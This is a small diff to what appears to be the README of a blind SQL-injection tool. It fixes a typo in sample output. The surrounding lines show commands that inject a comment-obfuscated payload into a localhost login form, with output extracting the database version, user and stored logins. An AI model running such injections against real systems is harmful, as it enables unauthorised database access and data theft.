@@ -8,25 +8,25 @@ Be sure you have no errors in SQL syntax, otherwise it may lead to false negativ
 //Injection into GET "http://localhost/login?username=admin&password=admin"
 python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select version()"
 Checking parametr "username" with injection "test'/**/or/**/"
-(+) Parametrs "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
+(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
 5.5.47-0+deb8u1
 (+) done!
 
 python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select user()"
 Checking parametr "username" with injection "test'/**/or/**/"
-(+) Parametrs "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
+(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
 root@localhost
 
 (+) done!
 python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method GET "select login from users"
 Checking parametr "username" with injection "test'/**/or/**/"
-(+) Parametrs "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
+(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
 admin
 (+) done!
 
 //Injection into POST "http://localhost/login" with body "username=test&password=test"
 python3 mysql_bb.py --url "http://localhost/login" --data "username=test&password=test"  --method POST "select version()"
 Checking parametr "username" with injection "test'/**/or/**/"
-(+) Parametrs "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
+(+) Parametr "username" is vulnerable to injection "test'/**/or/**/". Starting the exploit
 5.5.47-0+deb8u1
 ```
